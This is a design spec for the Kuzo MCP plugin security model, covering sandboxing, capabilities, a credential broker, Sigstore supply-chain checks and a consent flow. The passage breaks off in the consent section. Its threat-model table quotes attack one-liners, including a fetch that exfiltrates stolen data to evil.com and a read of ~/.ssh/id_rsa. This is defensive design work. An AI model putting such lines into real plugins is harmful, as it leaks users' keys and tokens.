# Phase 2.5: Plugin Security & Open-Source Readiness

> Design spec for hardening Kuzo MCP from trusted-only to untrusted third-party plugins.
> Research completed 2026-04-12. Phase 2.5a implemented — this doc captures the design, decisions, and interface sketches for the broader rollout.

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Threat Model](#2-threat-model)
- [3. Sandboxing Architecture](#3-sandboxing-architecture)
- [4. Capability Taxonomy](#4-capability-taxonomy)
- [5. Plugin Manifest v2](#5-plugin-manifest-v2)
- [6. Credential Broker](#6-credential-broker)
- [7. Cross-Plugin Isolation](#7-cross-plugin-isolation)
- [8. Supply Chain Security](#8-supply-chain-security)
- [9. Consent Flow](#9-consent-flow)
- [10. Implementation Plan](#10-implementation-plan)
- [11. Open Questions](#11-open-questions)

---

## 1. Overview

**Problem:** Kuzo MCP currently runs all plugins in a single Node.js process with full access to env vars, filesystem, network, and each other's tools. This is fine for first-party plugins but blocks open-sourcing — a malicious "weather" plugin could read `GITHUB_TOKEN` and exfiltrate it.

**Solution:** A layered security model that hardens incrementally:

| Layer | What It Prevents | When to Build |
|-------|-----------------|---------------|
| **Manifest + scoped callTool** | Cross-plugin abuse, tool squatting | Phase 2.5a (now) |
| **Intrinsic hardening** | Prototype pollution, process.exit, shutdown hangs | Phase 2.5a (now) |
| **Credential broker** | Token exfiltration via raw env var access | Phase 2.5b |
| **Consent flow + audit** | Uninformed capability grants, unobserved access | Phase 2.5c |
| **Process isolation** | Full sandbox escape (fs, net, system calls) | Phase 2.5d (when third-party plugins ship) |
| **Supply chain** | Compromised plugin packages | Phase 2.5e (when npm distribution ships) |

**Design principles:**
- **Capability-based:** Plugins can only access what they're given references to. No ambient authority.
- **Declarative:** Capabilities are declared in the manifest, not requested at runtime.
- **Incremental:** Each layer provides independent value. Earlier layers don't depend on later ones.
- **Invisible DX:** Plugin authors write normal TypeScript. Security is framework-enforced, not author-enforced.

---

## 2. Threat Model

### Current Vulnerabilities

| Threat | Current State | Exploitability | Impact |
|--------|--------------|----------------|--------|
| **Credential exfiltration** | All plugins share `process.env` via `ConfigManager` | Trivial — declare any env var in `requiredConfig` | Critical — stolen API tokens |
| **Unauthorized cross-plugin calls** | `callTool()` is unrestricted | Trivial — call any registered tool | High — mutate repos, create PRs, post comments |
| **Tool enumeration** | Probe `callTool("name", {})` — Zod error = exists, "not found" = doesn't | Easy — iterate common names | Medium — info leak of loaded plugins |
| **Prototype pollution** | `initialize()` runs in main process | Trivial — `Object.prototype.isAdmin = true` | Critical — affects all plugins + core |
| **Global monkey-patching** | No protection on `fetch`, `setTimeout`, etc. | Trivial — `globalThis.fetch = evilFetch` | Critical — intercept all HTTP |
| **process.exit()** | No override | Trivial — `process.exit(0)` | High — DoS, kills MCP server |
| **Shutdown hang** | `shutdownAll()` has no timeout | Easy — `shutdown() { await new Promise(() => {}) }` | Medium — server can't restart cleanly |
| **Filesystem escape** | Full `fs` access in main process | Trivial — `fs.readFile("~/.ssh/id_rsa")` | Critical — key theft |
| **Network exfiltration** | No network policy | Trivial — `fetch("https://evil.com", { body: stolenData })` | Critical — data exfiltration |
| **Supply chain compromise** | No signing, no verification, no registry | Medium — requires compromising an npm dependency | Critical — backdoor the server |

### Capability Matrix for Existing Plugins

What our 3 plugins actually need — the minimum viable permission set:

| Plugin | Credentials | Network | Filesystem | Cross-Plugin | System |
|--------|------------|---------|-----------|-------------|--------|
| `git-context` | (none) | (none) | read: `$CWD/.git/**` | (none) | exec: `git` |
| `github` | `GITHUB_TOKEN`, opt: `GITHUB_USERNAME`, `GITHUB_ORG` | `api.github.com` | (none) | `get_git_context` | (none) |
| `jira` | `JIRA_HOST`, `JIRA_EMAIL`, `JIRA_API_TOKEN` | `*.atlassian.net` | (none) | (none) | (none) |

---

## 3. Sandboxing Architecture

### Decision: Child Process Per Plugin (Phased)

**Evaluated options:**

| Approach | Security | DX Impact | Performance | Maturity | Verdict |
|----------|----------|-----------|-------------|----------|---------|
| **Worker threads** | None — same process, same fs/net/env | None | Low overhead | Stable | **Rejected** — no security boundary |
| **vm / vm2 / isolated-vm** | Repeatedly broken (vm2: 7 CVEs since 2022, latest 2026; isolated-vm: maintenance mode) | Moderate | Low | Fragile | **Rejected** — cat-and-mouse game |
| **Child processes** | Strong — OS-level isolation, separate address space | None (IPC is transparent) | ~30-50MB/plugin, 0.1-2ms IPC | Production-proven (VS Code, Chrome) | **Selected** |
| **WASM/WASI** | Very strong | Severe — no npm packages, no normal TS | Moderate | Experimental | **Rejected** — DX is fatal |
| **Node Permission Model** | Moderate (process-wide only) | None | None | Maturing (3 CVEs in Jan 2026) | **Defense-in-depth layer** on child processes |

### Architecture

```
┌─────────────────────────────────────────────────────┐
│  Core Process (MCP Server)                          │
│  stdin/stdout = MCP transport                       │
│  stderr = logging                                   │
│  PluginRegistry (proxy layer) ─── IPC Router        │
└────────┬──────────────┬──────────────┬──────────────┘
         │ IPC          │ IPC          │ IPC
    ┌────▼────┐    ┌────▼────┐    ┌────▼────┐
    │ Plugin  │    │ Plugin  │    │ Plugin  │
    │ Host    │    │ Host    │    │ Host    │
    │ github  │    │ jira    │    │ git-ctx │
    │         │    │         │    │         │
    │ env:    │    │ env:    │    │ env:    │
    │ GH_TOK  │    │ JIRA_*  │    │ (none)  │
    └─────────┘    └─────────┘    └─────────┘
```

**How it works:**
1. Core spawns `plugin-host.js` per plugin via `child_process.fork()`
2. Each child gets only its declared env vars (`env: { ...pluginVars }` option)
3. Child dynamically imports the plugin, exposes tools/resources over IPC
4. Core's `PluginRegistry` wraps each plugin in an IPC proxy — same `ToolDefinition` interface
5. `PluginContext.callTool()` routes through the core's IPC router, not direct function calls
6. Plugin crash = child process dies, core restarts it. Other plugins unaffected.

**Why this works for Kuzo:**
- MCP tool calls are already JSON-serialized (JSON-RPC over stdio). One more serialization hop over IPC adds 0.1-2ms — negligible vs the GitHub/Jira API latency.
- Plugin handlers already return JSON-serializable values (required by MCP protocol).
- 3 plugins at ~40MB each = ~120MB. Noise on a 16-64GB dev machine.
- Node Permission Model flags (`--permission --allow-fs-read=/path`) per child process.

**When to build:** Phase 2.5d — after manifest, credentials, and consent are done. Not needed until third-party plugins are real.

**Phase 2.5a-c alternative:** Before process isolation, use in-process hardening (intrinsic freezing, scoped callTool, credential broker). This provides strong protection against lazy/accidental overreach — the most likely threat from early community plugins. Process isolation is the defense against actively malicious code.

---

## 4. Capability Taxonomy

Five categories, each with specific granularity designed to be useful without being DX hell.

### credentials

Access to environment variables / secrets.

| Capability | Granularity | Example |
|-----------|-------------|---------|
| `credentials:env:<VAR>` | Per-variable | `credentials:env:GITHUB_TOKEN` |
| `credentials:env:<PREFIX>:*` | Prefix wildcard | `credentials:env:JIRA:*` → matches `JIRA_HOST`, `JIRA_EMAIL`, `JIRA_API_TOKEN` |

No `credentials:env:*` — that defeats the purpose.

Access mode on each credential determines how the plugin consumes it:
- **`client`** — Plugin receives a pre-authenticated API client. Never sees the raw token. Safest.
- **`authenticated-fetch`** — Plugin receives a `fetch()` wrapper that auto-injects auth headers. Never sees the raw token. Scoped to declared URL pattern.
- **`raw`** — Plugin gets the raw string value. Requires explicit user consent + audit logging. Escape hatch for non-HTTP protocols.

### network

Outbound HTTP/HTTPS requests.

| Capability | Granularity | Example |
|-----------|-------------|---------|
| `network:<domain>` | Per-domain | `network:api.github.com` |
| `network:<pattern>` | Wildcard subdomain | `network:*.atlassian.net` |

Not per-path (too fine), not per-protocol (irrelevant — threat is exfiltration, not transport).

**Enforcement v1:** Declaration + audit log only. Actual network interception (patching `fetch`/`http`) deferred to process isolation phase where child processes get domain-scoped network access.

### filesystem

File system read/write access.

| Capability | Granularity | Example |
|-----------|-------------|---------|
| `filesystem:read:<path>` | Path with globs | `filesystem:read:$CWD/.git/**` |
| `filesystem:write:<path>` | Path with globs | `filesystem:write:$CWD/.kuzo/cache/**` |
| `filesystem:read:cwd` | Shorthand | Current working directory (read-only) |

`$CWD` resolves at server start. `$HOME` explicitly NOT supported — nothing outside the project without specific paths.

### cross-plugin

Calling other plugins' tools.

| Capability | Granularity | Example |
|-----------|-------------|---------|
| `cross-plugin:<plugin>` | Per-plugin (all tools) | `cross-plugin:git-context` |
| `cross-plugin:<plugin>:<tool>` | Per-tool | `cross-plugin:git-context:get_git_context` |

Undeclared tools return "Tool not found" (not "Permission denied" — don't leak existence).

### system

OS-level operations.

| Capability | Granularity | Example |
|-----------|-------------|---------|
| `system:exec` | Can spawn child processes | General exec permission |
| `system:exec:<command>` | Specific binary | `system:exec:git` |

---

## 5. Plugin Manifest v2

### TypeScript Interfaces

```typescript
// --- Capability types ---

type CredentialAccessMode = "client" | "authenticated-fetch" | "raw";

interface CredentialCapability {
  kind: "credentials";
  /** Env var name or prefix pattern (e.g., "GITHUB_TOKEN" or "JIRA:*") */
  env: string;
  /** How the plugin consumes this credential */
  access: CredentialAccessMode;
  /** For authenticated-fetch: URL pattern (e.g., "https://api.github.com/*") */
  urlPattern?: string;
  /** For authenticated-fetch: how auth is injected */
  authScheme?: "bearer" | "basic" | "header";
  /** For basic auth: which credential key holds the username */
  basicUsername?: string;
  /** For header auth: custom header name */
  headerName?: string;
  /** Human-readable reason — shown during consent */
  reason: string;
}

interface NetworkCapability {
  kind: "network";
  /** Domain or pattern (e.g., "api.github.com" or "*.atlassian.net") */
  domain: string;
  reason: string;
}

interface FilesystemCapability {
  kind: "filesystem";
  access: "read" | "write" | "read-write";
  /** Path pattern with $CWD substitution */
  path: string;
  reason: string;
}

interface CrossPluginCapability {
  kind: "cross-plugin";
  /** Plugin name or "plugin:tool" */
  target: string;
  reason: string;
}

interface SystemCapability {
  kind: "system";
  operation: "exec";
  /** Specific command, or omit for general exec */
  command?: string;
  reason: string;
}

type Capability =
  | CredentialCapability
  | NetworkCapability
  | FilesystemCapability
  | CrossPluginCapability
  | SystemCapability;

// --- Updated KuzoPlugin ---

interface KuzoPluginV2 {
  name: string;
  description: string;
  version: string;

  /** Permission model version this plugin targets */
  permissionModel: 1;

  /** Required capabilities — all must be granted for plugin to load */
  capabilities: Capability[];

  /** Optional capabilities — plugin works without them */
  optionalCapabilities?: Capability[];

  // Note: requiredConfig/optionalConfig exist only on KuzoPluginV1 (legacy).
  // V2 plugins declare credential needs via capabilities with kind: "credentials".

  initialize(context: PluginContext): Promise<void>;
  shutdown?(): Promise<void>;
  tools: ToolDefinition[];
  resources?: ResourceDefinition[];
}
```

### Example: GitHub Plugin Manifest

```typescript
const githubPlugin: KuzoPluginV2 = {
  name: "github",
  description: "GitHub integration — PRs, reviews, repos, branches",
  version: "1.0.0",
  permissionModel: 1,

  capabilities: [
    {
      kind: "credentials",
      env: "GITHUB_TOKEN",
      access: "client",  // Gets pre-authenticated Octokit, never sees token
      reason: "Authenticates with the GitHub API for all operations",
    },
    {
      kind: "network",
      domain: "api.github.com",
      reason: "All GitHub API calls",
    },
    {
      kind: "cross-plugin",
      target: "git-context",
      reason: "Auto-detect repository and branch from local git",
    },
  ],

  optionalCapabilities: [
    {
      kind: "credentials",
      env: "GITHUB_USERNAME",
      access: "raw",
      reason: "Default owner for short repo names (e.g., 'myrepo' → 'owner/myrepo')",
    },
    {
      kind: "credentials",
      env: "GITHUB_ORG",
      access: "raw",
      reason: "Default organization for cross-org operations",
    },
  ],

  // ...tools, initialize, etc.
};
```

### Backwards Compatibility

The loader detects manifest version via `permissionModel` field:

- **Present (`permissionModel: 1`):** v2 capability model. In Phase 2.5a, enforcement is partial: credential-derived config and cross-plugin `callTool` scoping are enforced, while broader capability enforcement is planned for later sub-phases.
- **Absent:** Legacy mode. `requiredConfig`/`optionalConfig` treated as implicit credential capabilities. Legacy plugins do not yet require `KUZO_TRUST_LEGACY=true` — startup deprecation warnings and trust gates are planned for Phase 2.5c+.

Existing Phase 2 plugins continue working during the migration period. Each is migrated to the v2 manifest incrementally as Phase 2.5 rolls out.

---

## 6. Credential Broker

### Decision: Hybrid Broker (Pre-Auth Clients + Scoped Fetch + Raw Escape Hatch)

**Why not a single approach:**
- Pre-auth clients (Option A) don't scale to arbitrary third-party services — core must know every API client type.
- Scoped credential accessor (Option B) gives the plugin the raw token — zero exfiltration protection.
- Authenticated fetch (Option C) only works for HTTP APIs — not databases, WebSockets, gRPC.
- Hybrid (Option D) layers them: safest where possible, flexible where needed, audit-logged always.

### Interface

```typescript
interface CredentialBroker {
  /**
   * Pre-authenticated client for known services.
   * Plugin never sees the raw token.
   * Returns undefined if not configured or not authorized.
   *
   * Known services: "github" → Octokit, "jira" → JiraHttpClient
   */
  getClient<T>(service: string): T | undefined;

  /**
   * Fetch wrapper with auto-injected auth headers.
   * Plugin never sees the raw token. Enforces URL pattern from manifest.
   * Throws if plugin didn't declare this credential with "authenticated-fetch" access.
   */
  createAuthenticatedFetch(credentialKey: string): AuthenticatedFetch;

  /**
   * Raw credential value. LAST RESORT.
   * - Plugin must declare "raw" access in manifest
   * - Requires explicit user consent
   * - Every call is audit-logged
   */
  getRawCredential(key: string): string | undefined;

  /** Check availability without accessing the value */
  hasCredential(key: string): boolean;
}

type AuthenticatedFetch = (
  url: string | URL,
  init?: RequestInit,
) => Promise<Response>;
```

### Updated PluginContext

```typescript
interface PluginContext {
  /** @deprecated Use credentials broker instead. Removed in v2.0. */
  config: Map<string, string>;

  /** Credential broker — secure way to access secrets */
  credentials: CredentialBroker;

  /** Plugin-scoped logger */
  logger: PluginLogger;

  /** Cross-plugin tool invocation (scoped to declared dependencies) */
  callTool: (toolName: string, args: Record<string, unknown>) => Promise<unknown>;
}
```

### Client Factory Registry

For `getClient<T>()` to work, the broker needs to know how to create clients. Three options:

| Approach | Pros | Cons |
|----------|------|------|
| **(a) Hardcoded in broker** | Simple, safe — factory code is in the core | Doesn't scale past known services |
| **(b) Plugin registers factory** | Scales — plugin ships its own factory | Factory code touches raw creds, partially defeats the purpose |
| **(c) Plugin ships `createClient.ts`** | Clean separation — core imports from plugin dir | Core imports from plugin directories (coupling) |

**Recommendation:** Option (a) for first-party services (GitHub, Jira) + option (b) for third-party. The core ships factory functions for known services. Third-party plugins can register their own factory if they want `client` access mode — but the factory runs in the core's context, not the plugin's.

### Credential Storage (Phased)

| Phase | Storage Backend | When |
|-------|----------------|------|
| **2.5b** | Env vars (`.env` via dotenv) — same as today | Now — the value is the API contract, not the storage |
| **2.5d+** | `@napi-rs/keyring` for desktop, encrypted file fallback for headless/CI | When open-sourcing |

`@napi-rs/keyring` (v1.2.0, 77k weekly npm downloads, Rust binding via napi-rs, keytar-compatible API, no libsecret dependency on Linux) replaces the archived `keytar`. macOS headless caveat: login keychain must be unlocked (typically auto-unlocked on desktop login; SSH requires `security unlock-keychain`).

### Migration Path

1. **Phase 2.5b:** Add `credentials: CredentialBroker` to `PluginContext` alongside existing `config: Map`. Both work. Broker reads from same env vars.
2. **Phase 2.5b:** Migrate GitHub plugin: `context.credentials.getClient<Octokit>("github")` instead of `context.config.get("GITHUB_TOKEN")`.
3. **Phase 2.5b:** Migrate Jira plugin: `context.credentials.getClient<JiraClient>("jira")`.
4. **Phase 2.5c:** ~~Remove `config: Map` from `PluginContext`. Remove `requiredConfig`/`optionalConfig` from `KuzoPlugin`.~~ **DONE** — PR #13.

---

## 7. Cross-Plugin Isolation

### Scoped callTool

Current `callTool` in `PluginContext` is unrestricted — any plugin calls any tool. Fix:

```typescript
// In PluginLoader — build scoped callTool per plugin
const declaredDeps = new Set(
  plugin.capabilities
    .filter((c): c is CrossPluginCapability => c.kind === "cross-plugin")
    .map((c) => c.target.split(":")[0]) // "git-context:get_git_context" → "git-context"
);

const scopedCallTool = (toolName: string, args: Record<string, unknown>) => {
  const entry = this.registry.findTool(toolName);
  if (!entry || !declaredDeps.has(entry.plugin.name)) {
    // "Not found" — don't leak existence with "permission denied"
    throw new Error(`Tool "${toolName}" not found`);
  }
  return this.registry.callTool(toolName, args);
};
```

### Intrinsic Hardening

Before loading any plugins (in `server.ts`, before `loader.loadAll()`):

```typescript
// Freeze prototypes to prevent pollution
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
Object.freeze(RegExp.prototype);
Object.freeze(String.prototype);
Object.freeze(Number.prototype);
Object.freeze(Boolean.prototype);

// Snapshot critical globals for post-load verification
const originalFetch = globalThis.fetch;
const originalSetTimeout = globalThis.setTimeout;

// Override process.exit to prevent plugin DoS
const originalExit = process.exit;
process.exit = ((code?: number) => {
  logger.error(`Plugin attempted process.exit(${code}) — blocked`);
}) as typeof process.exit;
```

Also: start Node with `--disable-proto=delete` to remove `__proto__` accessor entirely.

### Shutdown Timeouts

```typescript
// In registry.shutdownAll()
const SHUTDOWN_TIMEOUT = 5000;

for (const plugin of this.plugins.values()) {
  if (plugin.shutdown) {
    try {
      await Promise.race([
        plugin.shutdown(),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("shutdown timeout")), SHUTDOWN_TIMEOUT)
        ),
      ]);
    } catch (err) {
      this.logger.error(`Plugin "${plugin.name}" shutdown failed/timed out`, err);
    }
  }
}
```

### Tool Name Prefixing

**Decision point** (see Open Questions). Two options:

| Option | Example | Breaking Change? | Squatting Prevention |
|--------|---------|-------------------|---------------------|
| Flat names (current) | `create_pull_request` | No | Collision detection at registration |
| Prefixed names | `github.create_pull_request` | Yes — all MCP clients need updating | Namespace isolation by design |

Prefixing should be done before open-sourcing (once) rather than after (breaking change with users).

---

## 8. Supply Chain Security

> **Status: shipped (Phase 2.5e).** This section describes the as-built implementation. Code lives in `packages/core/src/provenance/` (verification library) and `packages/cli/src/commands/plugins/` (CLI). Design origins are preserved in the git history of this file.

### 8.1 Decision: npm as the plugin registry

**Naming convention:** `@kuzo-mcp/*` scoped packages. (The original design called for unscoped `kuzo-mcp-plugin-*`. Locked decision #2 during 2.5e migrated to scoped — scoped enables friendly-name resolution, `install github` → `@kuzo-mcp/plugin-github`, without squatting risk on unscoped names.)

**Why npm:** Sigstore provenance attestations are built-in and free, Trusted Publishing (GA July 2025) is tokenless, discovery + distribution are already solved. No infrastructure to run or rotate.

**Provenance policy:** Plugins MUST have Sigstore provenance attestations. `kuzo plugins install` refuses unsigned packages unless the user passes `--trust-unsigned` (printed in red boxen and logged to the audit file). Current adoption is ~7% of npm — that's a bar we're willing to set for our ecosystem.

### 8.2 Trusted Publishing — what ships from this repo

All 6 `@kuzo-mcp/*` packages are published via OIDC Trusted Publishing from `.github/workflows/release.yml`. Operational guarantees:

- **No npm token.** No `NPM_TOKEN` / `NODE_AUTH_TOKEN` is set in the workflow env; release.yml has an explicit comment forbidding them. Publishes use the short-lived OIDC ID token minted by `actions/setup-node@v4` + the `id-token: write` permission.
- **`permissions: {}`** at workflow scope. The `release` job narrowly requests `id-token: write` (OIDC), `contents: write` (Version Packages PR + git push), `pull-requests: write`, `issues: write`. No other jobs, no other permissions.
- **Fork guard:** `if: github.repository == 'seantokuzo/seantokuzo-mcp'` prevents forks from triggering publishes under our trust identity.
- **`NPM_CONFIG_PROVENANCE: "true"`** + per-package `publishConfig: { "access": "public", "provenance": true }` double-arm the provenance attestation so a misconfiguration in either place alone wouldn't silently publish without one.
- **Concurrency lock:** `concurrency: { group: release-<ref>, cancel-in-progress: false }` — two pushes to main cannot race Changesets into version-order drift.
- **Package contents audited before every release.** Each package's `files` field is a whitelist of `dist/**/*.{js,d.ts,js.map,d.ts.map}`. Source files in `src/`, tests, fixtures, and secrets are never packed. Confirmed via `npm pack --dry-run` in CI.

### 8.3 Verification at install time — the trust boundary

`kuzo plugins install <name>` runs the `verifyPackageProvenance` pipeline from `@kuzo-mcp/core/provenance` BEFORE touching the filesystem with any plugin bytes. Algorithm (summarized from spec §C.1):

1. Resolve friendly-name → npm package name (built-ins map + optional `kuzo.config.ts` override).
2. Acquire the exclusive `~/.kuzo/plugins/.lock` (concurrent install/update/rollback/uninstall fail fast with exit 30).
3. Fetch the npm packument to discover `dist.attestations.url`.
4. Fetch both attestation bundles — the SLSA v1 provenance (keyless, Fulcio) AND the npm publish attestation (registry-keyed). Both must verify.
5. Verify each bundle via `sigstore.verify()` (the meta-package, not `@sigstore/verify` directly — spec §C.10.10). TUF trust-root is fetched from Sigstore's TUF repo and cached under `~/.kuzo/tuf-cache/` with `tufForceCache: true` so installs don't depend on Sigstore reachability after the first successful fetch.
6. Evaluate the `TrustPolicy` against the verified statement: subject digest must match the tarball's integrity, `certificateIdentityURI` (Fulcio SAN) must be prefix-matched against `allowedBuilders`, the builder repo must be in `firstPartyOrgs` or `allowThirdParty` must be true.
7. Only on full success: `pacote.extract` the tarball — pinned to the verified integrity hash — into `~/.kuzo/plugins/<name>/.tmp/pkg/`, then `npm install --ignore-scripts --omit=dev` for transitive deps.
8. Dynamic-import the staged manifest, run consent flow (§9), atomic rename `.tmp/` → `<version>/`, flip the `current` symlink, update `index.json`, prune retained versions beyond 3.

**Integrity-pinned extraction** closes the verify→extract TOCTOU window. pacote rejects any downloaded tarball whose SHA doesn't match the verified integrity — so an attacker who could swap bytes between our verify call and our extract call would get an `EINTEGRITY` error instead of a successful install (spec §C.9 + §C.10.1).

### 8.4 Default trust policy

Defined in `packages/core/src/provenance/policy.ts`:

```ts
export const DEFAULT_POLICY: TrustPolicy = {
  allowedBuilders: ["https://github.com/actions/runner"],
  firstPartyOrgs: ["seantokuzo"],
  allowThirdParty: true,
};
```

- **`allowedBuilders`** are Fulcio certificate identity URI prefixes. Only builds whose workflow ran in one of these hosted runners will verify. Extend via `--allow-builder <url>` at install time; changes are scoped to the single invocation and never persisted.
- **`firstPartyOrgs`** — SLSA `externalParameters.workflow.repository` must live under one of these GitHub orgs for the package to be classified `first-party`. Third-party packages still install (subject to `allowThirdParty`), but they go through the additional review prompt and get `source: "third-party"` in the local index.
- **`allowThirdParty: true`** — third-party plugins are permitted by default. Set to false to lock the install surface to `firstPartyOrgs` only. This is the knob to flip for enterprise / paranoid deployments.

### 8.5 Cached verification evidence

Per-version evidence lives at `~/.kuzo/plugins/<name>/<version>/verification.json` with the shape defined in `verification-cache.ts`:

```ts
interface CachedVerification {
  schemaVersion: 1;
  package: { name: string; version: string; integrity: string };
  verifiedAt: string;             // ISO 8601
  firstParty: boolean;
  repo: string;
  builder: string;
  predicateTypes: string[];
  attestationsCount: number;
  policySnapshot?: TrustPolicy;   // optional only for back-compat with D.1/D.2
}
```

The cache is **non-authoritative**. It accelerates `kuzo plugins verify <name>` (no network round-trip when `policySnapshot` still equals the active policy) but can never GRANT verification status — any install/update re-runs the full sigstore verify pipeline. An attacker with write access to `~/.kuzo/` can forge cache entries and will still fail to cause an install because verification always runs anew.

Cache invalidation rules:
- **Policy snapshot mismatch** → re-verify and rewrite on next `kuzo plugins verify`.
- **Missing `policySnapshot` field** (pre-Phase-2.5e-D.3 install) → treated as a forced cache miss; same re-verify path.
- **`kuzo plugins refresh-trust-root`** → wipes `~/.kuzo/tuf-cache/` AND `~/.kuzo/attestations-cache/` so the next install re-fetches Sigstore state from the source.
- **Plugin uninstall** → cache entry remains on disk (if `--keep-versions`). Non-authoritative, so leaving it costs nothing.

### 8.6 Plugin update model — never auto-update

Deliberate adaptation from the ShadyPanda lesson (a Chrome extension campaign that silently pushed malware to 4.3M users via auto-update). `kuzo plugins update` is manual, one-plugin-at-a-time or all-at-once, always explicit:

```
kuzo plugins update               # update all installed (summary at end)
kuzo plugins update github        # update single plugin
kuzo plugins update --to 1.3.0    # pin to a specific version
kuzo plugins update --dry-run     # verify + print plan, no writes
```

Every update path re-runs the full verification pipeline on the new version (no cache reuse on install/update paths — §C.8), stages the new tarball under a lock, and diffs the new manifest's `capabilities` against the user's existing consent record:

- **Subset or equal** → silently reuse consent, refresh the stored `pluginVersion` field so `isConsentStale` doesn't re-fire.
- **Added or removed capabilities** → surface a `+ / -` diff table and re-prompt. Declining aborts that plugin only; the rest of the update batch proceeds.

There is no background update daemon. The MCP server never mutates installed plugins. `kuzo plugins update` is the ONLY write path other than `install` / `rollback` / `uninstall`.

### 8.7 Rollback is NOT implicitly safer than upgrade

`kuzo plugins rollback <name> [version]` defaults to the previous version (`retainedVersions[1]`). The target may declare **different** capabilities than the current install — older versions can be narrower OR broader. Rollback therefore runs the same consent-diff flow as update. "Downgrade" is never treated as automatically trusted.

Rollback does NOT re-verify provenance (the target version was verified at original install time and its `verification.json` still lives on disk). Users who want to re-confirm after a rollback run `kuzo plugins verify <name>` explicitly; that re-fetches Sigstore and refreshes the per-version cache.

### 8.8 Retention + concurrency

- **Retention:** last 3 versions per plugin on disk, enforced on every write in `state.ts#upsertEntry`. Pruning deletes the oldest versioned directory.
- **Concurrency:** single exclusive lock at `~/.kuzo/plugins/.lock` (`O_CREAT | O_EXCL`). Stale-pid detection via `process.kill(pid, 0)`. Lock payload records `{ pid, command, startedAt }` so the error message can name the holder. Read-only commands (`list`, `verify`) do not acquire the lock.
- **Atomic writes:** `index.json` writes are tmp-file + rename; staging-to-versioned promotion is a single `rename()` within the same filesystem; symlink flips are `unlink` + `symlink`. Commit order for multi-step writes is always metadata-first (index), then non-atomic (symlink), with a best-effort revert of the metadata if the non-atomic step fails.

### 8.9 Audit log

Every security-relevant plugin event is logged to `~/.kuzo/audit.log` as a JSON line and echoed to stderr via `KuzoLogger`. The closed `AuditAction` union in `packages/core/src/audit.ts` covers:

```
credential.{client_created, raw_access, raw_denied, fetch_created}
consent.{granted, revoked, checked}
plugin.{loaded, skipped, failed, installed, uninstalled, updated, rolled_back, trust_root_refreshed}
```

Each event records `timestamp`, `plugin` (friendly name, or `"system"` sentinel for trust-root refresh), `action`, `outcome` (`allowed | denied | error`), and a `details` object with context specific to the action (from/to version, integrity hash, consent outcome, etc.). Denials are logged too — `trust-unsigned`, consent-declined updates, verification failures all produce a record.

Query the log with `kuzo audit --since 7d` (CLI command forthcoming in a post-2.5 phase) or a direct `jq` over the JSONL file.

### 8.10 CLI surface + exit-code map

```
kuzo plugins install <name>[@version]   # verify → consent → commit
kuzo plugins update [name]              # single or all; diffs capabilities
kuzo plugins rollback <name> [version]  # restore retained version
kuzo plugins verify <name>              # re-run provenance against installed
kuzo plugins list [--json]              # show installed plugins + source
kuzo plugins uninstall <name>           # remove + revoke consent
kuzo plugins refresh-trust-root         # wipe TUF + attestations caches
```

Exit codes are structured so shell pipelines can act on them:

| Range | Domain | Examples |
|-------|--------|----------|
| 10-19 | Provenance verification | 10 `E_NO_ATTESTATION`, 13 `E_THIRD_PARTY_BLOCKED`, 14 `E_SIGNATURE_INVALID` |
| 20 | Rollback recovery | `E_NO_RETAINED_TARGET` — hint: `install <pkg>@<version>` |
| 30 | Concurrency | `E_PLUGINS_LOCKED` — holder PID in error message |
| 40-46 | Install domain | 40 `E_INVALID_SPEC`, 41 `E_UNSUPPORTED_REGISTRY`, 45 `E_LEGACY_MANIFEST`, 46 `E_NAME_MISMATCH` / `E_VERSION_MISMATCH` |
| 42-44 | Staging | 42 extract, 43 deps install, 44 manifest load |
| 47 | Uninstall | `E_NOT_INSTALLED` (uninstall-specific code kept for backward-compat) |
| 48-53 | Update / verify / rollback | 48 `E_NOT_INSTALLED`, 49 partial-failure (multi-plugin update), 50 resolve, 51 version-dir-missing, 52 version-not-retained, 53 already-current |

### 8.11 Threat model for third-party plugin authors

If you're publishing a `@your-org/kuzo-plugin-*` and want it verifiable by Kuzo users:

1. **Publish via GitHub Actions with Trusted Publishing.** No long-lived npm tokens. The release must run inside a workflow that Kuzo's policy accepts — any workflow on the `actions/runner` hosted runner qualifies for `allowedBuilders` by default.
2. **Pass `--access public` + `--provenance`** (or set `publishConfig` in package.json). Both attestations (SLSA + npm publish) must land.
3. **Follow the V2 plugin manifest contract** defined in `@kuzo-mcp/types`. `capabilities` and `optionalCapabilities` are the trust boundary with the installer — every capability is shown to the user during install + on any capability change.
4. **Don't ship anything outside `dist/`.** Your `files` field is the audit trail users will read. Source files, lockfiles, CI scripts, `.env.example` — none of it should be in the tarball.
5. **If Kuzo users want to install from an org not in `firstPartyOrgs`,** they need `--allow-third-party` (permissive by default but a policy flip could lock it). No way around signing.

If you want your plugin accepted into `firstPartyOrgs`: open a PR against `packages/core/src/provenance/policy.ts`. The first-party list is a short, auditable constant — not a registry or a database.

---

## 9. Consent Flow

### Challenge: Headless MCP Server

Kuzo MCP runs as a stdio server started by Claude — stdout is the MCP transport, there's no TTY for interactive prompts. The consent flow must happen out-of-band.

### Design: `kuzo consent` CLI Command

A dedicated CLI command for reviewing and granting permissions. Runs interactively with full terminal UI.

```
$ kuzo consent

┌─ Plugin: github v1.0.0 ───────────────────────────────────
│  "GitHub integration — PRs, reviews, repos, branches"
│
│  Required capabilities:
│    [CREDENTIALS]   GITHUB_TOKEN (client mode)
│                    → Authenticates with the GitHub API
│    [NETWORK]       api.github.com
│                    → All GitHub API calls
│    [CROSS-PLUGIN]  git-context
│                    → Auto-detect repository and branch
│
│  Optional capabilities:
│    [CREDENTIALS]   GITHUB_USERNAME (raw mode)
│                    → Default owner for short repo names
│    [CREDENTIALS]   GITHUB_ORG (raw mode)
│                    → Default organization for cross-org operations
│
│  Grant all? [Y]es / [n]o / [r]eview each
└────────────────────────────────────────────────────────────
```

### Consent Storage

```jsonc
// ~/.kuzo/consent.json
{
  "version": 1,
  "plugins": {
    "github": {
      "pluginVersion": "1.0.0",
      "permissionModel": 1,
      "granted": [
        { "kind": "credentials", "env": "GITHUB_TOKEN", "access": "client" },
        { "kind": "network", "domain": "api.github.com" },
        { "kind": "cross-plugin", "target": "git-context" }
      ],
      "denied": [],
      "grantedAt": "2026-04-12T10:00:00Z"
    }
  }
}
```

### Non-Interactive Mode (for MCP Server Startup)

The MCP server cannot prompt. Instead:

```bash
# Trust specific plugins (first-party, pre-reviewed)
KUZO_TRUST_PLUGINS=git-context,github,jira node dist/core/server.js

